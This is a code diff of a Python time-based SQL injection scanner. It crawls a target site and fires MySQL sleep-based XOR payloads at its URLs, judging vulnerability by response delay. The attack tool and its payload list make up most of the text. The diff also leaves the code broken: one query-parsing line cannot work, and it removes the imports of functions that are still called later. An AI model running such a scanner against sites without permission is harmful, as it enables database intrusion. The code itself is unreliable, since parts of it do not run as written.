@@ -1,16 +1,11 @@
 import requests
 import argparse
 import time
-from urllib.parse import urljoin, urlparse, parse_qs, quote
+from urllib.parse import urljoin, urlparse, urlencode
 from bs4 import BeautifulSoup
 import threading
-import sqlite3
-import csv
-import json
-import os
 import re
 
-# Time-based XOR payloads provided
 TIME_BASED_XOR_PAYLOADS = [
     "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
     "0\"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z",
@@ -67,16 +62,22 @@ class TimeBasedSQLiTester:
 
     def test_payload(self, url, payload):
         try:
-            encoded_payload = quote(payload)  # Ensure payload is URL encoded
-            full_url = url + encoded_payload
+            # Parse the base URL
+            parsed_url = urlparse(url)
+            query = dict(parsed_url.query.split('&'))
+            # Append the payload as a query parameter
+            query['payload'] = payload
+            encoded_query = urlencode(query)
+            full_url = parsed_url._replace(query=encoded_query).geturl()
+            
             start_time = time.time()
             r = requests.get(full_url, cookies=self.config.cookies, headers={'User-Agent': self.config.user_agent}, proxies=self.config.proxies, timeout=self.config.timeout)
             response_time = time.time() - start_time
             vulnerable = response_time > self.config.sleep_time
             
-            with self.lock:  # Ensure thread-safe access to shared data
+            with self.lock:
                 self.results.append({
-                    'url': url,
+                    'url': full_url,
                     'payload': payload,
                     'vulnerable': vulnerable,
                     'response_time': response_time,
@@ -84,7 +85,7 @@ class TimeBasedSQLiTester:
                     'content_length': len(r.content)
                 })
         except requests.exceptions.RequestException as e:
-            print(f"Request to {url + payload} failed: {e}")
+            print(f"Request to {url} failed: {e}")
         except Exception as e:
             print(f"An error occurred: {e}")
 
@@ -111,7 +112,6 @@ class TimeBasedSQLiTester:
             for link in soup.find_all(['a', 'link'], href=True):
                 href = link['href']
                 full_url = urljoin(base_url, href)
-                parsed_url = urlparse(full_url)
                 if base_url in full_url and full_url not in urls:
                     urls.add(full_url)
 
@@ -157,7 +157,7 @@ class TimeBasedSQLiTester:
         url_parts = list(urlparse(url))
         query = dict(parse_qs(url_parts[4]))
         query.update(params)
-        url_parts[4] = '&'.join([f"{key}={quote(value)}" for key, value in query.items()])  # URL encode the query parameters
+        url_parts[4] = '&'.join([f"{key}={quote(value)}" for key, value in query.items()])
         return urljoin(url, url_parts[2] + '?' + url_parts[4])
 
     def display_results(self):
@@ -214,7 +214,6 @@ class Config:
         self.generate_html = args.generate_html
 
     def validate(self):
-        # Basic URL validation
         parsed_url = urlparse(self.url)
         if not parsed_url.scheme or not parsed_url.netloc:
             raise ValueError("Invalid URL format")
